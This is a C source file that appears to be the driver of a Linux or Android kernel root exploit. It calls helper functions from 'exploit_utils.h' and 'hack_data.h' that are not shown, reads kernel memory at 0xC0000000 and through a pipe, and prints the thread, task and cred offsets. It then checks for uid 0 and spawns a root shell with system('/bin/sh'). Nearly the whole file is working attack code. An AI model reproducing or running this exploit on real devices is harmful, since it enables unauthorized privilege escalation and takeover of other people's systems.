#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include "exploit_utils.h"
#include "hack_data.h"
#include "crusty.h"

void ping_root_test() 
{
    unsigned char buf[16];
    unsigned char kbuf[8192];
    int i;
    
    printf("[%s]pingpong_read_values_at_address.\n", __FUNCTION__);
    pingpong_read_values_at_address(0xC0000000, (int *)buf, sizeof(buf));
    printf("[%s]pingpong_read_values_at_address called.\n", __FUNCTION__);
    
    for(i = 0; i < sizeof(buf); i++) {
        printf("%02x ", buf[i]);
    }
    printf("\n");
    
    printf("g_thread_info: 0x%x, g_thread_task: 0x%x, "
            "g_task_cred: 0x%x, g_task_comm: 0x%x, g_cred_offset: 0x%x.\n", 
        g_thread_info, 
        g_thread_task,
        g_task_cred,
        g_task_comm,
        g_cred_offset);
        
    read_kernel_memory_by_pipe(g_thread_task, kbuf, sizeof(kbuf));
    
    for(i = 0; i < sizeof(kbuf); i++) {
        if(kbuf[i] > 0x20 && kbuf[i] < 127) {
            printf("..%c", kbuf[i]);
        }
        else {
            printf("x%02x", kbuf[i]);
        }
        if((i+1) % 32 == 0){
            printf("\n");
        }
    }
    printf("\n");
    
    if (getuid() != 0) {
        printf("Failed to obtain root privilege.\n");
        exit(EXIT_FAILURE);
    }
    
    printf("execute system shell.\n");
    system("/bin/sh");
    exit(EXIT_SUCCESS);
    
    printf("[%s]infinite loop. don't have to come here.\n", __FUNCTION__);
    while(1) {
        sleep(1);
    }
}

int main(int argc, char *argv[])
{
    ping_root_test();
}

